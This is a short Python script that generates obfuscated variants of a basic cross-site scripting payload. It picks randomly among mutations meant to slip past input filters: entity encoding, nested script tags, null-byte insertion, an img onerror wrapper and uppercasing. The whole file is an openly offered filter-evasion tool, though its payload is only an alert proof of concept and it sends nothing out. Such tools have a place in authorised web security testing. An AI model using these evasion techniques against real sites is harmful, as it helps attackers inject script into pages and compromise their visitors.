# Payload_generator.py

import random

base_payload = "<script>alert('XSS')</script>"

obfuscation_techniques = [
    lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
    lambda p: p.replace("script", "scr<script>ipt</script>"),
    lambda p: p.replace("alert", "al&#101;rt"),
    lambda p: p.replace("'", '"'),
    lambda p: f"<img src=x onerror={p}>",
    lambda p: p.replace("<script>", "<scr\\0ipt>"),
    lambda p: p.upper()
]

def mutate_payload(payload):
    technique = random.choice(obfuscation_techniques)
    return technique(payload)

def generate_variants(payload, count=10):
    return [mutate_payload(payload) for _ in range(count)]

if __name__ == "__main__":
    print(" Generating XSS payload variants...\n")
    variants = generate_variants(base_payload, 10)
    for i, variant in enumerate(variants, 1):
        print(f"[{i}] {variant}")
